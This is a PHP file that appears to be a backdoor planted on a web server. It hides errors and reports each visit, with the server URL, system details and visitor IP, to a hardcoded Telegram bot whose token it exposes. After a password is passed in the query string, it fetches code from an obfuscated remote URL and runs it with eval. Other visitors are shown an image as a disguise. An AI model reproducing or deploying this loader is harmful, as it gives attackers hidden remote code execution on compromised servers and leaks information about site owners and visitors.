<?php
error_reporting(0);
ini_set('display_errors', 0);

session_start();

// Telegram Configuration
define('TELEGRAM_ID', '6271018062');
define('TELEGRAM_KEY', '8636832279:AAFlYlkIa3UwYyBN4c0wuYRkEbaAJQ3VLyU');
define('TELEGRAM_SECRET', 'GHOSTROOT');

function sendTelegramNotification($force = false) {
    if (!$force && !isset($_SESSION[TELEGRAM_SECRET])) return;

    $url = (isset($_SERVER['HTTPS']) ? "https" : "http") .
           "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

    $message = "🚀 File Diakses\n\n"
             . "🔗 URL: `$url`\n"
             . "🖥 Server: `" . php_uname() . "`\n"
             . "📅 Time: " . date('Y-m-d H:i:s') . "\n"
             . "🌐 IP: $_SERVER[REMOTE_ADDR]";

    $telegramUrl = "https://api.telegram.org/bot" . TELEGRAM_KEY . "/sendMessage";

    $data = [
        'chat_id' => TELEGRAM_ID,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context = stream_context_create($options);
    @file_get_contents($telegramUrl, false, $context);
}

function is_logged_in() {
    return isset($_SESSION['R10TXER']);
}

function login($password) {
    $valid_password_hash = '$2b$12$VG0cHGhAs6sJYfXW9FPLm.qwZvcx4QBW3StTBRQmC7AVnesZhwOBq';
    if (password_verify($password, $valid_password_hash)) {
        $_SESSION['R10TXER'] = 'user';
        sendTelegramNotification();
        return true;
    }
    return false;
}

function logout() {
    unset($_SESSION['R10TXER']);
}

if (isset($_GET['password'])) {
    $password = $_GET['password'];
    if (login($password)) {
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        echo '<script>alert("Password salah!");</script>';
    }
}

function getContent($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);

    if ($content === false) {
        $content = file_get_contents($url);
    }
    return $content;
}

function encode_url($url) {
    $encoded_url = base64_encode($url);
    $encoded_url = str_rot13($encoded_url);
    return urlencode($encoded_url);
}

function decode_url($encoded_url) {
    $decoded_url = str_rot13(urldecode($encoded_url));
    return base64_decode($decoded_url);
}

// Notif dikirim tiap akses
sendTelegramNotification(true);

$encoded_url = 'nUE0pUZ6Yl9lLKphrzI2MKWcrP5wo20ipzS3Y2SgnKW1oTkfoTkf';
$decoded_url = decode_url($encoded_url);

if (is_logged_in()) {
    sendTelegramNotification();
    if ($decoded_url) {
        $content = getContent($decoded_url);
        eval('?>' . $content);
        exit;
    }
} else {
    header('Content-Type: image/jpeg');
    $image_path = 'https://i.ibb.co.com/h1chKbLD/b2huntersbanner.png';
    readfile($image_path);
}
?>